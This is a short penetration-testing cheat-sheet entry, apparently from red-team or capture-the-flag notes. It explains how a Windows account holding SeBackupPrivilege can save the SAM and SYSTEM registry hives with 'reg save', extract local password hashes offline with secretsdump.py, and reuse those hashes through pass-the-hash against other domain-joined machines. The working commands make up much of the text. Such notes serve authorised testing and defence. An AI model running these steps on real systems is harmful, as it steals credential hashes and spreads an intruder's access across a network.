# SeBackupPrivilege Hive Dump

If `whoami /priv` shows `SeBackupPrivilege` enabled, you can read the SAM/SYSTEM hives directly without needing a remote Backup Operators-style dump — `reg save` bypasses normal file ACLs under this privilege:

```cmd
reg save HKLM\SAM C:\Users\<user>\Documents\SAM
reg save HKLM\SYSTEM C:\Users\<user>\Documents\SYSTEM
```
```bash
secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL
```
If the recovered local Administrator/local-account hash also works via pass-the-hash against *other* domain-joined boxes, check that next — identical local admin passwords across machines (no LAPS) is extremely common.
